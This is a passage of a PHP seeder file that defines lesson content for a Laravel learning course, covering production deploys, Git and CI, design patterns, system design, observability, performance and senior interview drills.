                        ['Practice it out loud', 'Take a route from this app and narrate its full journey to HTML, naming each middleware it passes and what each one could have rejected.'],
                        ['Interview drill', 'Trace a request to <code>/roadmap</code> from entry to HTML — where would you add a custom header, and which layer would you choose and why?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-12', 'code' => 'M2', 'slug' => 'm2-queues-cache-deploy', 'order' => 1, 'sort' => 39,
                'title' => 'M2 — Queues, Cache, Config, Deploy',
                'summary' => 'Background jobs, cache invalidation, env config, zero-downtime habits.',
                'difficulty' => 'advanced', 'minutes' => 45, 'checkpoint' => true,
                'body' => $this->body(
                    'M2 — Production Laravel',
                    'Stage 12 · Backend / Laravel Production · Laravel',
                    [
                        ['Queues: move the slow part off the request', 'A request that sends email, calls three APIs, and generates a PDF will hit timeouts on its worst day. Push that work to a queue; a worker process picks it up, retries with backoff, and parks permanent failures in <code>failed_jobs</code> where you can see them. The design constraint never changes: <strong>retries will happen</strong>, so handlers are idempotent (I2). The rule of thumb: anything the user does not need to watch finish belongs in a job.'],
                        ['Cache invalidation is the bug class, not the speedup', 'Caching hot reads is easy — <code>Cache::remember("key", $ttl, fn() => ...)</code> — the hard part is what happens on write. Stale cache means users see yesterday\'s data after an edit, a class of bug that appears only in production and only sometimes. The patterns that survive review: invalidate the key on every write path, keep TTLs short enough to bound staleness, and never cache per-user data under a shared key.'],
                        ['Configuration: env in dev, cached config in prod', '<code>.env</code> is local developer convenience; production reads <code>config:cache</code> so no file is parsed per request. Secrets never enter git — the leak vector is history, not the working tree. The 12-factor shape: everything environment-specific is an environment variable, the code is identical across environments.'],
                        ['Zero-downtime deploys are a sequence, not an event', 'Enter maintenance mode → run the release: migrations that are backward-compatible (expand, migrate data, contract — never rename-and-drop in one step) → deploy code → build assets → warm config/cache → verify health → exit maintenance. Blue/green or rolling deploys add instant rollback. The habit that makes all of it boring: rehearse the rollback plan <em>before</em> you need it.'],
                        ['The checklist that turns "it works" into "it is ready"', 'HTTPS enforced, error tracking wired (Sentry-style), structured logs with request ids, a health endpoint (Laravel ships <code>/up</code>), backups tested by an actual restore, and alerts on the error rate. Each line exists because its absence was somebody\'s incident.'],
                        ['Practice it out loud', 'Plan the safe rename of a column: list every deploy step in order, naming which step breaks the old code if you get the order wrong.'],
                        ['Interview drill', 'How do you deploy a migration that renames a column without downtime? What does "backward-compatible migration" mean step by step?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-12', 'code' => 'M3', 'slug' => 'm3-git-ci', 'order' => 2, 'sort' => 41,
                'title' => 'M3 — Git Workflow & CI',
                'summary' => 'Branch/merge/PR habits; semver; GitHub Actions running Pint + Pest on every push.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'M3 — Git & Continuous Integration',
                    'Stage 12 · Backend / Laravel Production · Practice',
                    [
                        ['Version control is a safety net with a social layer', 'The local mechanics — <code>status</code>, <code>diff</code>, <code>log</code>, small commits with messages a stranger could parse — are table stakes. The judgement calls are what interviews probe: never commit <code>.env</code> or secrets (history keeps them even after a later delete), and commit <em>before</em> an experiment so refactoring has a checkpoint to return to.'],
                        ['Branch → pull request → review → merge, kept short-lived', 'Short-lived branches minimise the drift that causes conflicts; the PR is where design discussion happens against a concrete diff. Teams pick either rebase-for-linear-history or merge commits — both are defensible, mixing them casually is not. The hard rule underneath the choice: <strong>never rebase a shared branch</strong>. Rebase rewrites commits; anyone who pulled your old ones now has a divergent history that looks like two versions of the same work.'],
                        ['Conflicts: understand before you edit', 'A conflict marker means two people changed the same lines with different intents — resolve by finding the combination that satisfies both intentions, not by picking a side reflexively. Then run the test suite: a resolved conflict that compiles can still be logically wrong. Keep formatting fixes in their own commit so logic diffs stay reviewable — the same separation you saw in N3\'s review lens.'],
                        ['Semantic versioning as a contract', '<strong>MAJOR</strong> for breaking changes, <strong>MINOR</strong> for backwards-compatible additions, <strong>PATCH</strong> for fixes. Applied to APIs and packages alike, it lets consumers read a version number and know whether upgrading demands code changes. An API that bumps major without a deprecation window breaks the promise the number exists to make.'],
                        ['CI: the merge gate that enforces all of the above', 'On every push: install dependencies, check style (Pint), run the suite (Pest), optionally run static analysis (PHPStan). Red blocks merge — that is the entire point; a CI that everyone overrides has become ceremony. This repository runs exactly that pipeline in <code>.github/workflows/tests.yml</code> on a pinned runner: read it after this lesson and you have seen a production-shaped pipeline rather than a tutorial one. Hosted runners and containers retired most Jenkins/Vagrant glue — same ideas (automated build, environment parity), far less ops.'],
                        ['Practice it out loud', 'Make a local commit, decide out loud whether rewriting it is safe (pushed yet?), then undo it both ways: <code>git commit --amend</code> for unpushed, <code>git revert</code> for shared history.'],
                        ['Interview drill', 'What must be green before merge? How do you undo a bad local commit that has not been pushed — and what changes once it is on the remote?'],
                    ],
                ),
            ],

            // --- Stage 13 ---
            [
                'stage' => 'stage-13', 'code' => 'N1', 'slug' => 'n1-patterns-core', 'order' => 0, 'sort' => 40,
                'title' => 'N1 — Factory, Strategy, Repository, Decorator',
                'summary' => 'Patterns only after feeling the problem; trade-offs; when not to use.',
                'difficulty' => 'advanced', 'minutes' => 45, 'checkpoint' => false,
                'body' => $this->body(
                    'N1 — Core Design Patterns',
                    'Stage 13 · Design Patterns & Architecture · CS / PHP',
                    [
                        ['Learn patterns by feeling the pain first', 'A pattern name dropped on code that never suffered the problem is vocabulary without understanding. The order that works: feel the pain → name the pattern → one PHP example → its trade-off → when NOT to use it. Every pattern below follows that arc — read them as answers to specific pains, not a catalogue to memorise.'],
                        ['Factory: when creation logic starts leaking everywhere', 'The naive version scatters <code>new StripeClient()</code> / <code>new PaypalClient()</code> across callers; the pain is duplicated construction logic and hard-wired dependencies. A factory hides <em>which</em> concrete class is built behind one entry point — pick the driver by environment or config in a single place. Trade-off: indirection; when there is exactly one implementation, the factory is ceremony.'],
                        ['Strategy: the if/else chain that keeps growing', 'Export as CSV or JSON? Discount 10% or 20%? A growing <code>switch</code> on a mode flag means every new mode edits the same function (violating OCP). Strategy names each algorithm as a class behind one interface and lets the caller pick an instance. The honest counterpoint interviews want: with two stable branches, a plain <code>if</code> is often clearer — the pattern pays when the modes multiply or need independent testing.'],
                        ['Repository: putting persistence in its place', 'Domain code calling <code>Model::where()</code> everywhere welds your rules to your schema; a repository interface (<code>UserRepository::findActive()</code>) keeps the domain depending on an abstraction you own. The pragmatic note: in small Laravel apps the Eloquent model often <em>is</em> the repository — adding another layer on top is over-abstraction until you genuinely need a second persistence choice or a domain free of framework imports.'],
                        ['Decorator: adding behaviour by wrapping', 'Stack logging, timing, and retry around a handler without editing it — each layer implements the same interface, calls the next, and adds its concern before/after. You already use the most famous PHP example: middleware (M1). The trade-off is debuggability: five stacked decorators mean stack traces and implicit ordering, so keep the stack shallow and named.'],
                        ['When NOT to use any of them', 'Pattern theatre — a Factory for one class, a Strategy with a single implementation, a Repository over one table — is YAGNI with jargon. The test: is a second case real, or imagined? If a plain function or a two-line branch says it clearly, plain wins; you can always pattern-ise when the pain actually arrives.'],
                        ['Practice it out loud', 'Find an <code>if/else</code> chain over a "type" in any code you have written, then decide out loud whether it is strategy-ready or YAGNI — defend both answers.'],
                        ['Interview drill', 'Strategy vs an if/else chain — when does the plain switch win? Name the cost you take on by choosing the pattern.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-13', 'code' => 'N2', 'slug' => 'n2-di-architecture', 'order' => 1, 'sort' => 41,
                'title' => 'N2 — DI, Container, Modular Architecture',
                'summary' => 'Constructor injection; service container; modules/packages; boundaries.',
                'difficulty' => 'advanced', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'N2 — DI & Architecture',
                    'Stage 13 · Design Patterns & Architecture · Laravel',
                    [
                        ['Dependency inversion, said concretely', 'The naive version: a class calls <code>new Mailer()</code> inside a method — now that class owns construction, configuration, and the concrete vendor; testing it means sending real email. The inverted version declares what it needs: <code>__construct(private Mailer $mailer)</code>. The class states its dependency as part of its contract, the caller (or container) supplies it, and a test passes a fake in one line. "Depend on abstractions" is not abstract at all — it is this constructor signature.'],
                        ['The container is just the thing that builds constructors', 'Laravel reads type-hints, resolves each class recursively, and hands you the finished object — interfaces are mapped to concrete classes in a service provider\'s <code>register()</code>. The payoff: wire once, swap in tests, and a new constructor parameter does not require hunting call sites, because there are no manual call sites left. The caution: a container that resolves 40 things in one boot is a sign the boundaries are wrong, not that the container is clever.'],
                        ['Boundaries: framework at the edges, domain in the middle', 'A domain service importing <code>Illuminate\Http\Request</code> cannot be used from a console command or tested without HTTP scaffolding. The rule: high-level business rules depend on plain types and your own interfaces; controllers, jobs, and commands adapt the framework <em>to</em> the domain at the edges. This is what makes the core of an app portable and honest — and it is the difference between "Laravel app" and "app that uses Laravel".'],
                        ['Modularity: folders that can say no', 'Feature folders (or packages) with a small public API and no cyclic imports — <code>Billing</code> may use <code>Notifications</code>, never the reverse. When two modules import each other, you no longer have modules; you have a knot with directory names. Enforce it with namespace discipline and, at scale, tooling that fails CI on forbidden imports.'],
                        ['Practice it out loud', 'Take a class that news up a collaborator, inject the interface, and write the one-line test fake — then explain which of the four SOLID letters each edit satisfied.'],
                        ['Interview drill', 'How does constructor DI improve testability? Walk through binding an interface to an implementation in a provider — and name a smell that would tell you the container is being overused.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-13', 'code' => 'N3', 'slug' => 'n3-code-review-refactor', 'order' => 2, 'sort' => 42,
                'title' => 'N3 — Code Review, Smells, Refactoring',
                'summary' => 'Find smells; incremental refactor; technical debt trade-offs.',
                'difficulty' => 'senior', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'N3 — Review & Refactor',
                    'Stage 13 · Design Patterns & Architecture · Practice',
                    [
                        ['The smell list, learned as symptoms not labels', 'Long method (a paragraph of intent crammed into one function), duplication (the same logic that will be fixed in one place but not the other), mystery names (<code>$tmp2</code>), feature envy (a method reading another object\'s data more than its own), shotgun surgery (one requirement touching ten files), commented-out code (indecision preserved in amber). You do not need the taxonomy memorised — you need to feel when reading code is harder than writing it was.'],
                        ['Refactoring: small steps, always green', 'The discipline is behavioural: tests pass before, tests pass after, and each step is small enough that a failure names the exact move that caused it. Never combine a rename with a logic change in one commit — when it breaks, you cannot tell which half did it. This is also why pint-style formatting runs as its own commit: style churn must never bury a real diff.'],
                        ['Technical debt has interest rates, not just balances', 'Some shortcuts are wise — a weekend prototype that proved the market. The problem is untracked debt: an unexamined hack whose cost compounds every time someone builds on it. The senior move is to name it (a TODO with a real ticket, an ADR, a comment stating the constraint), schedule the payoff, and refuse the version where nobody remembers it exists.'],
                        ['The review lens, in the order it catches damage', '<strong>Correctness</strong> first (does it do what the PR claims, at the edges?), then <strong>security</strong> (authz on every new endpoint? input escaped? secrets out?), then <strong>clarity</strong> (could a teammate debug this at 2 a.m.?), then <strong>performance</strong> (N+1, unbounded queries), and <strong>style</strong> last — because a tool already owns it. Leaving style comments when there are correctness ones is misallocating the reviewer\'s attention.'],
                        ['Practice it out loud', 'Open any PR diff — yours or a public one — and leave three comments in the order above, forcing yourself to skip any style nit because a deeper issue exists.'],
                        ['Interview drill', 'Review this diff: what do you change first, and why does style rank last even though tools fix it first?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-13', 'code' => 'N4', 'slug' => 'n4-uml-for-php', 'order' => 3, 'sort' => 43,
                'title' => 'N4 — UML for PHP: Class & Sequence Diagrams',
                'summary' => 'Boxes, arrows, multiplicity; sequence diagrams for requests in this app.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'N4 — UML for PHP Developers',
                    'Stage 13 · Design Patterns & Architecture · CS',
                    [
                        ['A diagram is a sketch language, not bureaucracy', 'UML earns its keep in exactly two moments: when you need everyone looking at the same structure during a design conversation, and in whiteboard interview rounds where drawing is the expected medium. Used that way it is fast — thirty seconds of boxes beats twenty minutes of prose. Used as documentation you maintain forever, it rots. Draw for the conversation in front of you.'],
                        ['Class diagrams: the five symbols that cover real usage', 'A box is a class — name, fields, methods, each prefixed with visibility (<code>-</code> private, <code>+</code> public, <code>#</code> protected). The lines and arrowheads carry the relationships: <code>—|&gt;</code> inheritance, <code>◆—</code> composition (the part cannot exist without the whole), <code>◇—</code> aggregation (the part can), <code>··&gt;</code> dependency (a temporary use — a method call), and a dashed arrow to <code>«interface»</code> for realization. If you can read these six, you can read any class diagram you will meet.'],
                        ['Multiplicity: where the "many" lives', 'Numbers on the ends say how many: <code>1</code>, <code>0..1</code>, <code>*</code>. The Lesson → Stage relation writes as <code>Stage 1 ─&lt; * Lesson</code> — exactly one stage per lesson, many lessons per stage. Getting this backwards ("Stage * ─ 1 Lesson") is the most common whiteboard slip, and restating it aloud ("one stage, many lessons") catches it immediately.'],
                        ['Sequence diagrams: time runs down, calls run across', 'Vertical lifelines are the participants (objects), horizontal arrows are calls in order, and nested activation boxes show call depth. They shine for flows where ordering is the bug: auth middleware before controller, cache check before query, event raised after commit. Numbers or activations make the nesting explicit — the diagram answers "who called whom, in what order" in a way a class diagram never can.'],
                        ['Sketch this app\'s request flow once', 'For <code>GET /lessons/{slug}</code>: router → <code>pages::lesson-show</code> <code>mount</code> → <code>Lesson</code> + prerequisites query → view render → HTML response. That five-box sketch is the M1 lifecycle you already traced, now in interview-whiteboard form — draw it from memory three times and it sticks permanently.'],
                        ['When to skip the diagram', 'Trivial getters, a single class with two methods, a flow your pair already nodded through — drawing it anyway is process for its own sake. The judgement call is part of the skill: sketch when the structure is contested or complex; talk when it is not.'],
                        ['Practice it out loud', 'Whiteboard (paper counts) the User ↔ LessonProgress relationship with visibility and multiplicity, narrating each arrow as you draw it.'],
                        ['Interview drill', 'Draw the class relationship for User ↔ LessonProgress — say the multiplicity aloud before you write it, then justify each arrowhead choice.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-13', 'code' => 'N5', 'slug' => 'n5-gof-patterns-laravel', 'order' => 4, 'sort' => 44,
                'title' => 'N5 — GoF Patterns in Laravel',
                'summary' => 'Factory Method, Abstract Factory, Prototype, Strategy, Observer, Decorator, Command, Null Object, Visitor — each with when-not-to.',
                'difficulty' => 'advanced', 'minutes' => 50, 'checkpoint' => false,
                'body' => $this->body(
                    'N5 — GoF Patterns Applied',
                    'Stage 13 · Design Patterns & Architecture · CS / Laravel',
                    [
                        ['The Gang of Four, used instead of recited', 'The classic catalogue sorts patterns into creational (how objects come to be), structural (how they compose), and behavioural (how they collaborate). This lesson maps each one to a place you have already seen it — the goal is recognition, not recall: when the pain shows up in your code, the name should surface on its own.'],
                        ['Creational: who decides what gets built', '<ul><li><strong>Factory Method</strong> — a subclass or factory method picks the concrete class (payment gateway per environment)</li><li><strong>Abstract Factory</strong> — a whole <em>family</em> of related objects (light/dark UI kit controls that must match)</li><li><strong>Prototype</strong> — clone a configured template (report layouts) instead of rebuilding — beware shared mutable state between clones</li><li><strong>Service Locator</strong> — the ambient <code>app()</code> grab-bag: convenient, but it hides dependencies; constructor DI (N2) is the fix</li></ul>'],
                        ['Structural: how pieces fit together', '<ul><li><strong>Composite</strong> — a tree of parts behind one API (menu items and submenus treated identically, folder/file)</li><li><strong>Decorator</strong> — wrap to add behaviour: Laravel middleware and stream filters are this pattern at production scale</li><li><strong>Facade</strong> — one simple face over a busy subsystem (<code>Bus</code>, <code>Cache</code> facades); note it simplifies, while Adapter <em>converts</em> an interface (F3\'s distinction, restated)</li></ul>'],
                        ['Behavioural: how objects collaborate', '<ul><li><strong>Strategy</strong> — swap algorithms at runtime (export formats, discount rules)</li><li><strong>Observer</strong> — listeners react to events (<code>event()</code> / <code>Event::listen</code>); decouples producer from N side effects</li><li><strong>Command</strong> — a request packaged as an object so it can be queued, logged, or undone (Laravel queued jobs, form requests)</li><li><strong>Null Object</strong> — a no-op collaborator instead of scattered null checks (<code>NullLogger</code>)</li><li><strong>Visitor</strong> — double dispatch over a closed set of elements with an open set of operations — powerful for compilers/ASTs, rare in CRUD; you weighed it in N5\'s exercises</li></ul>'],
                        ['The singleton caution, restated for containers', 'Global mutable state is a testing tax and a hidden-write hazard: anyone can poke the shared instance. Laravel container singletons are request-scoped services with a managed lifecycle — not application-wide mutable globals you reach into from anywhere. The distinction is ownership: one writer versus many.'],
                        ['When not to — YAGNI again, deliberately', 'One branch forever, no second implementation, no test seam to open: plain code wins. Patterns buy optionality, and optionality has a reading cost — pay it only when the second case is real.'],
                        ['Practice it out loud', 'Give a Null Object example from this app (hint: an optional logger or a default collaborator), then justify whether middleware is decorator or chain-of-responsibility — or both.'],
                        ['Interview drill', 'Observer vs polling? When is an event-driven design <em>worse</em> than a direct call? Give a Null Object example you have actually used.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-13', 'code' => 'N6', 'slug' => 'n6-enterprise-patterns-laravel', 'order' => 5, 'sort' => 45,
                'title' => 'N6 — Enterprise Patterns Mapped to Laravel',
                'summary' => 'Registry, Front/Page/Application Controller, Template View, Transaction Script, Domain Model — where each lives in this app.',
                'difficulty' => 'advanced', 'minutes' => 45, 'checkpoint' => true,
                'body' => $this->body(
                    'N6 — Enterprise Patterns → Laravel',
                    'Stage 13 · Design Patterns & Architecture · CS / Laravel',
                    [
                        ['These are names for files you already own', 'Enterprise patterns sound academic until you learn each one is a shape already present in every Laravel app — often several per request. Learning the names lets you read architecture literature, explain your own code precisely, and answer whiteboard questions by pointing at your daily work rather than reciting definitions.'],
                        ['Front Controller: one door for every request', 'Every request enters through a single dispatcher — <code>public/index.php</code> hands off to the router configured in <code>bootstrap/app.php</code>. This is the classic PECL front-controller pattern, and it is why no URL maps to a physical file: one entry point routes, applies middleware, and dispatches anywhere in the application.'],
                        ['Page and Application controllers: who acts, who coordinates', 'A <strong>Page Controller</strong> is one action per page — a Livewire page component like <code>pages::learn-dashboard</code> or a route closure doing its one job. The <strong>Application Controller</strong> is the shared machinery that decides <em>who runs</em> — middleware stack, route-action resolution, exception handler — without owning business rules itself. The distinction matters in review: business logic drifting into the dispatch layer is where "fat middleware" smells begin.'],
                        ['Template View: presentation stays in the view', 'Blade templates render; they should not decide. When a template starts computing business values (totals, eligibility, discounts), the rule has moved somewhere no unit test will reach — extract it to a service or action and let the view format what it is given. This is the pattern name for "keep controllers thin", and it is checkable: count the PHP decisions in your blade files.'],
                        ['Registry: the tempting global lookup', 'A Registry is a bag of globally reachable services — and Laravel\'s container is its sanctioned relative. The danger both share: dependencies become invisible. A method calling <code>Registry::get(\'db\')</code> has an unstated dependency no signature reveals, so tests must populate globals and refactors cannot see the edges. Prefer injection (N2); the container exists so you never need a registry.'],
                        ['Transaction Script vs Domain Model: the choice that ages with the app', '<strong>Transaction Script</strong> is a procedural procedure per use case — validate, write rows, commit — and it is exactly right for simple CRUD where the rules fit in a paragraph. <strong>Domain Model</strong> is rich objects owning their invariants (loan interest, money math) and pays off when branches and rules multiply across endpoints. The migration signal: the same invariants repeating, tangles of conditionals, tests needing fixtures for rule state. Model rules as objects then — but do not model <code>UPDATE settings SET …</code> as a domain entity.'],
                        ['The pragmatic ladder', 'Start with Transaction Script and thin pages; promote a controller to a Domain Model only when rules multiply. Say the ladder out loud in interviews — "start simple, escalate on evidence" reads as judgement, while "we use DDD everywhere" on a CRUD app reads as résumé-driven development.'],
                        ['Practice it out loud', 'Map six enterprise patterns to files in this repository, then name one place where business logic currently sits too close to the dispatch layer.'],
                        ['Interview drill', 'Where is the Front Controller in a Laravel app? When would you promote a controller to a Domain Model — what evidence do you wait for?'],
                    ],
                ),
            ],

            // --- Stage 14 ---
            [
                'stage' => 'stage-14', 'code' => 'O1', 'slug' => 'o1-system-design-basics', 'order' => 0, 'sort' => 43,
                'title' => 'O1 — System Design Fundamentals',
                'summary' => 'Requirements, scaling, load balancing, DB choice, cache, queues.',
                'difficulty' => 'senior', 'minutes' => 50, 'checkpoint' => false,
                'body' => $this->body(
                    'O1 — System Design Fundamentals',
                    'Stage 14 · System Design & Production Engineering · CS',
                    [
                        ['The interview method: requirements before boxes', 'The most common failure in design interviews is drawing infrastructure before agreeing on what the system must do. Run the sequence: functional requirements (what it does) → non-functional requirements (target latency, expected scale, consistency needs) → high-level design (the boxes and arrows) → deep dives on the two riskiest parts → explicit trade-offs. Each phase narrows the solution space so the eventual diagram is justified rather than decorative.'],
                        ['Scaling out starts by making servers disposable', 'Stateless application servers behind a load balancer — any request can land anywhere — because state lives in shared storage (database, cache). Only when one server class saturates do you reach for read replicas (spread reads) or sharding (split data across machines). The order matters: scale the cheapest lever first, and know that every leap adds operational surface: failover, consistency, and tooling you now own.'],
                        ['The building blocks, and the problem each one solves', '<ul><li><strong>Cache</strong> — hot data read constantly but changing rarely</li><li><strong>Queue</strong> — absorb spikes and move slow work off the request path</li><li><strong>CDN</strong> — static assets and cacheable responses at the edge</li><li><strong>Read replicas</strong> — read load exceeding one primary\'s capacity</li></ul> <p>Each block trades something real: cache trades staleness for latency, queues trade immediacy for throughput, replicas trade consistency for read scale. Naming the trade, not just the tool, is what marks a senior answer.'],
                        ['Consistency is chosen per domain, not per system', 'Money movements demand strong consistency — a balance must never display an amount that was never true. Like counts, feeds, and analytics can tolerate eventual consistency because a few seconds of lag changes nothing that matters. Design interviewers probe exactly here: pick your consistency model per data type and defend it, rather than declaring the whole system "eventually consistent" as a thought-terminating cliché.'],
                        ['Practice drill: the URL shortener', 'Work it in the method\'s order: requirements (short links, redirect, basic analytics) → API (<code>POST /shorten</code>, <code>GET /{code}</code>) → key generation (base62 counter or hash with collision retry) → storage (a <code>redirects</code> table, code as primary key) → cache the hot codes → scale step (replicate, then partition if truly needed). Do this aloud once and you have rehearsed the whole format on the most classic prompt there is.'],
                        ['Interview drill', 'Estimate QPS for your design, justify SQL versus a key-value store for it, and name the single point of failure you would fix first.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-14', 'code' => 'O2', 'slug' => 'o2-observability-incidents', 'order' => 1, 'sort' => 44,
                'title' => 'O2 — Observability, Reliability, Incidents',
                'summary' => 'Logs, metrics, tracing; SLOs; postmortems; chaos awareness.',
                'difficulty' => 'senior', 'minutes' => 45, 'checkpoint' => false,
                'body' => $this->body(
                    'O2 — Observability & Incidents',
                    'Stage 14 · System Design & Production Engineering · Ops',
                    [
                        ['Three signals, three questions', '<ul><li><strong>Logs</strong> — discrete events with context: "which order failed, and why?" (structured JSON, queryable)</li><li><strong>Metrics</strong> — numeric time series: "is error rate rising right now?" (rates, latency percentiles, saturation)</li><li><strong>Traces</strong> — one request\'s path across services: "which hop added the 800ms?"</li></ul> <p>Metrics tell you <em>that</em> something is wrong, logs tell you <em>what</em> happened, traces tell you <em>where</em>. Debugging an incident without all three means guessing with partial data — and the senior reflex is to ask which of the three you are missing.</p>'],
                        ['SLOs turn "feels slow" into a budget', 'An SLI is what you measure (availability percentage, p95 latency); an SLO is the target you commit to (99.9% monthly, p95 under 300ms). The payoff is the <strong>error budget</strong> — 0.1% allowed failure per month — which converts release arguments into arithmetic: burn the budget fast, and feature releases pause until it recovers. Choose targets users actually feel, not vanity numbers.'],
                        ['Incidents: mitigate first, learn second, never both at once', 'The first minutes belong to restoration — roll back, flip the feature flag, fail over — because users are hurting and diagnosis on a broken system is guesswork anyway. Only afterwards does the postmortem begin: timeline, contributing factors, and actions that stay fixed (a test, an alarm, a guard), blameless because blame makes the next report dishonest. The measure of a good incident is the one that cannot recur for the same reason.'],
                        ['Health checks that mean something', 'Laravel ships <code>/up</code>; distinguish <strong>readiness</strong> (can this instance take traffic? — database reachable) from <strong>liveness</strong> (is this process alive at all? — restart me otherwise). A health endpoint that returns 200 while the database is down is worse than none: it tells your load balancer to keep sending traffic into the hole.'],
                        ['Practice it out loud', 'Given a latency spike alert, narrate your first five minutes in order — which dashboard you open first, and what result sends you where next.'],
                        ['Interview drill', 'How do you debug a latency spike in production? Name the signal you check first and the one teams usually forget.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-14', 'code' => 'O3', 'slug' => 'o3-performance-profiling', 'order' => 2, 'sort' => 45,
                'title' => 'O3 — Performance: Measure, Profile, Optimize',
                'summary' => 'CPU, I/O, DB, cache; profiling tools; don’t guess.',
                'difficulty' => 'senior', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'O3 — Performance Engineering',
                    'Stage 14 · System Design & Production Engineering · Practice',
                    [
                        ['The loop: measure, find, change one thing, measure again', '"It feels slow" is an opinion, not data. Establish a baseline (a repeatable timing under realistic data), locate the hotspot with evidence — query count, profiler frame, slow-query log — change <em>one</em> variable, and re-measure against the same baseline. One change per iteration, or you cannot attribute the improvement. This discipline is the entire difference between performance engineering and performance superstition.'],
                        ['The usual suspects, ranked by how often they win', 'N+1 queries (the page issues one query per row), a missing index on a filtered/joined column, unnecessary work per request (config not cached, recomputed constants), a cold cache serving every request to the database, and synchronous external calls in the request path. Notice most are architecture-adjacent, not CPU-bound: PHP rarely needs micro-optimisation before the database does.'],
                        ['Tools matched to the question', 'Memory questions: <code>memory_get_peak_usage()</code>. Where does time go: a profiler (Blackfire/Tideways-style, or debugbar in dev). Is it the database: query log plus <code>EXPLAIN</code>. Is it the network or a third party: browser waterfalls and distributed traces. Pick the instrument by the hypothesis — opening a CPU profiler for what is probably a missing index wastes the hour.'],
                        ['Big O still outranks every micro-tweak', 'An <code>O(n²)</code> loop over 100k rows will not be saved by shaving string concatenations; the algorithm change dwarfs any constant-factor win. Measure first, then take the biggest frame on the flame graph — usually an algorithm or a query plan, occasionally a hot loop worth tightening.'],
                        ['Practice it out loud', 'Take a page doing 50 SQL queries: narrate the optimisation pass — what you measure first, which fix you expect to dominate, and how you prove it worked.'],
                        ['Interview drill', 'Walk through optimising a page that does 50 SQL queries per request: order your steps, and state what result would tell you to stop.'],
                    ],
                ),
            ],

            // --- Stage 15 ---
            [
                'stage' => 'stage-15', 'code' => 'P1', 'slug' => 'p1-senior-interview-drills', 'order' => 0, 'sort' => 46,
                'title' => 'P1 — Senior Interview: Architecture & Trade-offs',
                'summary' => 'Design drills, review drills, behavioral stories, one-question protocol.',
                'difficulty' => 'senior', 'minutes' => 50, 'checkpoint' => false,
                'body' => $this->body(
                    'P1 — Senior Interview Drills',
                    'Stage 15 · Senior Interview Preparation · Practice',
                    [
                        ['A senior loop is four different tests in one day', 'Expect: a <strong>system design</strong> round (~45 min: requirements → architecture → deep dive), a <strong>coding or concurrency scenario</strong> (reason under constraints, not leetcode gymnastics), a <strong>performance or incident walkthrough</strong> (debug a production story live), and a <strong>code review</strong> of a deliberately messy file. Each tests a different muscle — the mistake is preparing only the one you enjoy. Rehearse all four in rotation, timed.'],
                        ['Trade-off language is the senior accent', 'Every strong answer follows the same skeleton: <em>options → criteria → choice → risks → how I would measure</em>. "I\'d use a cache" is a mid-level answer; "given read-heavy traffic and tolerable staleness, I\'d cache at this layer — the risk is invalidation, which I\'d handle with X and verify via hit-rate and stale-read metrics" is a senior one. The structure matters more than which option you pick; interviewers are listening for the skeleton.'],
                        ['Behavioural: STAR with ownership and numbers', '<strong>S</strong>ituation sets context in one sentence, <strong>T</strong>ask is <em>your</em> responsibility, <strong>A</strong>ction is what <em>you</em> did (the decisions, not the team\'s), <strong>R</strong>esult is quantified — latency down 40%, incidents halved — plus what you learned. Two failure modes to avoid: a result with no number (unmemorable) and actions where the team is the subject (ownership evaporates). Credit the team in the outcome; keep the decisions in the action.'],
                        ['Code review: name concrete findings', 'The file will hide real issues; your job is to find them by category — a race on shared state, missing authorization on an endpoint, an N+1 inside a loop, an unclear API contract, a missing test for the branch most likely to break. Say findings in severity order with the <em>why</em> ("this leaks data across tenants because…"), not as a checklist of style opinions. Two sharp findings beat ten nitpicks.'],
                        ['The one-question protocol', 'Take questions one at a time: clarify out loud before answering, restate the constraint you are solving for, then answer. Thinking silently for ninety seconds is fine; answering an assumed question is not. When you do not know, say so and pivot to method: "I have not used that specific tool, but I would evaluate it against these criteria." Honesty plus method reads better than bluffing to an expert.'],
                        ['Practice it out loud', 'Run one full 45-minute simulation on a design prompt with a timer, recording yourself — then review for the trade-off skeleton and filler words.'],
                        ['Interview drill', 'Structure a 15-minute design prompt (shortener for a candidate): what do you evaluate in each phase — and which phase do juniors skip?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-15', 'code' => 'P2', 'slug' => 'p2-explain-it-back', 'order' => 1, 'sort' => 47,
                'title' => 'P2 — Explain-it-Back & Final Readiness',
                'summary' => 'Teach concepts back; self-assess; plan continued practice.',
                'difficulty' => 'senior', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->body(
                    'P2 — Explain-it-Back',
                    'Stage 15 · Senior Interview Preparation · Practice',
                    [
                        ['The final exam is teaching, not reciting', 'Pick a concept from this course and explain it as if to a junior developer — one coherent narrative, analogies where they help, precise terms where they matter. A reviewer checks three things: correctness (no hand-waved facts), depth (can you go one level down when probed?), and gaps (did you mention the failure mode?). If you cannot explain it simply, you have found the next thing to study — that is the point of the exercise, not a verdict.'],
                        ['The topic list that maps to this whole course', 'PHP request lifecycle (A0 + M1); composition vs inheritance (F4); the N+1 problem (K2); CSRF (L3); queue idempotency (I2); cache invalidation (M2). Six prompts covering foundations, design, data, security, concurrency, and production — the same six pillars every interview day touches. Run them cold, one at a time, without notes.'],
                        ['What "senior" actually certifies', 'Not memorised APIs — a colleague two jobs ago could have looked those up. Senior means: fundamentals that transfer between languages, trade-offs argued rather than asserted, failure designed for instead of hoped against, communication clear enough to brief a teammate in five minutes, and the habit of mentoring others up. Notice none are credentials; all are demonstrable in how you answer the drills from P1.'],
                        ['Your exit criteria — the course\'s finish line', 'See PHP_LEARNING_PLAN §14: fundamentals → language → CS → backend → production → architecture → interviews, with checkpoints passed along the way. The gate is evidence, not attendance: a passed checkpoint, a project you can defend, and an explain-back delivered without notes.'],
